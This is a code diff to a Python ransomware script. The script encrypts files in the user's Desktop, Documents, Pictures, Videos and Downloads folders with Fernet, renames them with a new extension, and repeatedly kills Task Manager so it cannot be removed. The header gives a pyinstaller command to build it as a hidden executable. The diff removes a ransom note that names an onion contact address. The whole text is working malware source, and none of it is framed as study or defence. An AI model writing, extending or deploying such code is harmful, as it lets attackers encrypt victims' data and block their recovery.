@@ -1,7 +1,6 @@
 # Always encryption %userprofile%/Desktop, %userprofile%/Documents, %userprofile%/Pictures, %userprofile%/Videos, %userprofile%/Downloads
 # No console update v1.0.2+
 # pyinstaller --onefile --icon=NONE --noconsole abc_ransomware_decrypt_v0_1_2_noconsole_update.py
-# Crypt file: *.*.crypt000as21p
 
 import time, os, psutil, sys
 from cryptography.fernet import Fernet
@@ -18,7 +17,7 @@ def encrypt_file(file_path, key):
         with open(file_path, 'wb') as file:
             file.write(encrypted_data)
         
-        new_file_path = file_path + '.crypt000as21p'
+        new_file_path = file_path + '.abcd'
         os.rename(file_path, new_file_path)
 
     except Exception as e:
@@ -61,19 +60,10 @@ def main():
                     encrypt_file(full_path, key)
         else:
             print
-        
-    with open(os.path.join(user_profile, "Desktop", "readme.txt"), "w", encoding="utf-8") as info_file:
-        info_file.write("Your files have been encrypted by Hacker Lod\n")
-        info_file.write("To recover your files, please follow the instructions below:\n")
-        info_file.write("1. Find the encryption key in the file key_abc001.txt very hard.\n")
-        info_file.write("2. Pay the 1$ ransom and contact us with Tor Browser at 2091pad90as2ejclcsaczlclad8201lfrjfso210fds.onion and email 3P02made9102@2091pad90as2ejclcsaczlclad8201lfrjfso210fds.onion\n")
-        info_file.write("3. After payment, we will send you the decryption program to recover your files.\n")
-        info_file.write("Note: Do not try to recover your files by yourself or use third-party software, as it may lead to permanent data loss.\n")
-        info_file.write("If you have any questions, please contact us immediately.\n")
             
     while True:
         for process in psutil.process_iter(['name']):
-            if process.info['name'] and process.info['name'].lower() in ['taskmgr.exe', 'resmon.exe']:
+            if process.info['name'] and process.info['name'].lower() in ['taskmgr.exe']:
                 print("Process detected: " + process.info['name'])
                 process.kill()
         time.sleep(5)
